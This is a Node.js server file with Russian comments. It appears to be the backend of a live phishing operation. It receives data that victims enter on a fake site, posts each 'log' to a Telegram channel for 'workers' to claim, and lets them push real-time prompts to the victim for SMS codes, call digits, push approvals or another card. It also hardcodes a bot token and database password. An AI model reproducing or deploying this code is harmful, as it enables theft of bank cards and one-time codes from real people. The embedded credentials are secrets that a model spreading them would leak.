const express = require('express');
const axios = require('axios');
const mongoose = require('mongoose');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// --- КОНФИГУРАЦИЯ ---
const BOT_TOKEN = '8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw';
const CHANNEL_ID = '-1003455979409';
const MONGO_URI = 'mongodb+srv://multmoment27_db_user:tgLoUlcEPVjsnZgb@cluster0.vzajrjd.mongodb.net/?retryWrites=true&w=majority'; 

// --- ПОДКЛЮЧЕНИЕ К БАЗЕ ---
mongoose.connect(MONGO_URI)
    .then(() => console.log('✅ База данных подключена'))
    .catch(err => console.error('❌ Ошибка базы:', err));

const Worker = mongoose.model('Worker', new mongoose.Schema({
    workerId: String,      
    workerName: String, // Добавили имя для отображения в канале
    targetUserId: String   
}));

let userTasks = {}; 
let logsStorage = {}; 

const cmdTexts = {
    'sms': 'Введите код подтверждения из СМС',
    'call': 'Введите последние 4 цифры номера, с которого поступит звонок',
    'push': 'Подтвердите вход в мобильном приложении',
    'bal': 'Недостаточно средств на карте. Попробуйте другую карту',
    'support': 'Ошибка безопасности. Опишите проблему оператору в чате'
};

const safeText = (text) => String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

// --- ПРИЕМ ЛОГА С САЙТА ---
app.post('/api/log', async (req, res) => {
    const { userId, type, data } = req.body;
    logsStorage[userId] = { type, data, time: new Date().toLocaleTimeString() };

    // Проверяем, закреплен ли юзер за кем-то
    const connection = await Worker.findOne({ targetUserId: userId });

    let channelMsg = '';
    if (connection) {
        // Если лог ПОВТОРЯЮЩИЙСЯ
        channelMsg = `<b>⚠️ ПОВТОРЯЮЩИЙСЯ ЛОГ [${safeText(type)}]</b>\n`;
        channelMsg += `🆔 ID: <code>${safeText(userId)}</code>\n`;
        channelMsg += `📍 Закреплен за: <b>${connection.workerName || 'Воркером'}</b>`;
    } else {
        // Если лог НОВЫЙ
        channelMsg = `<b>🆕 НОВЫЙ ЛОГ [${safeText(type)}]</b>\n`;
        channelMsg += `🆔 ID: <code>${safeText(userId)}</code>\n`;
        channelMsg += `📍 Статус: 🔵 Ожидает воркера...`;
    }

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHANNEL_ID,
        text: channelMsg,
        parse_mode: 'HTML',
        reply_markup: { 
            inline_keyboard: [[{ text: "⚡️ ВЗЯТЬ В РАБОТУ", callback_data: `take_${userId}` }]] 
        }
    }).catch(e => console.log("Ошибка канала"));
    
    res.json({ success: true });
});

app.get('/api/check/:userId', (req, res) => {
    const userId = req.params.userId;
    const task = userTasks[userId] || null;
    if (task) { delete userTasks[userId]; }
    res.json(task);
});

// --- ВЕБХУК ТЕЛЕГРАМ ---
app.post('/tg-webhook', async (req, res) => {
    try {
        const { message, callback_query } = req.body;

        if (message && message.text) {
            const chatId = message.chat.id;
            if (message.text === '/start') {
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId, text: "<b>👋 Бот готов!</b>", parse_mode: 'HTML'
                });
            } else {
                const conn = await Worker.findOne({ workerId: chatId });
                if (conn) {
                    userTasks[conn.targetUserId] = { action: 'ask', text: message.text };
                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        chat_id: chatId, text: `✅ Отправлено пользователю <code>${conn.targetUserId}</code>`, parse_mode: 'HTML'
                    });
                }
            }
        }

        if (callback_query) {
            const workerId = callback_query.from.id;
            const workerName = callback_query.from.username ? `@${callback_query.from.username}` : callback_query.from.first_name;
            const [action, userId, code] = callback_query.data.split('_');

            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: callback_query.id
            }).catch(() => {});

            if (action === 'take') {
                // Обновляем базу: записываем КТО взял этот лог
                await Worker.findOneAndUpdate(
                    { workerId: workerId }, 
                    { targetUserId: userId, workerName: workerName }, 
                    { upsert: true }
                );

                const log = logsStorage[userId];
                let fullMsg = `<b>💎 УПРАВЛЕНИЕ ЛОГОМ</b>\n🆔 ID: <code>${userId}</code>\n\n`;
                if (log && log.data) {
                    for (let key in log.data) { fullMsg += `<b>${key}:</b> <code>${log.data[key]}</code>\n`; }
                }

                // Отправляем панель управления воркеру в ЛС
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    chat_id: workerId,
                    text: fullMsg,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "💬 СМС", callback_data: `ask_${userId}_sms` }, { text: "📞 Звонок", callback_data: `ask_${userId}_call` }],
                            [{ text: "📲 Пуш", callback_data: `msg_${userId}_push` }, { text: "💰 Баланс", callback_data: `msg_${userId}_bal` }],
                            [{ text: "✍️ Свой текст", callback_data: `custom_${userId}` }]
                        ]
                    }
                });
                
                // Изменяем текст в канале
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                    chat_id: CHANNEL_ID,
                    message_id: callback_query.message.message_id,
                    text: `<b>✅ ЛОГ ВЗЯТ</b>\n🆔 ID: <code>${userId}</code>\n📍 Воркер: <b>${workerName}</b>`,
                    parse_mode: 'HTML'
                }).catch(() => {});
            }

            if (action === 'custom') {
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    chat_id: workerId, text: `⌨️ <b>Введите текст для юзера <code>${userId}</code>:</b>`, parse_mode: 'HTML'
                });
            }

            if (action === 'ask' || action === 'msg') {
                userTasks[userId] = { action, text: cmdTexts[code] || "Введите данные" };
            }
        }
    } catch (e) { console.error("Webhook Error:", e.message); }
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Сервер запущен на порту ${PORT}`));
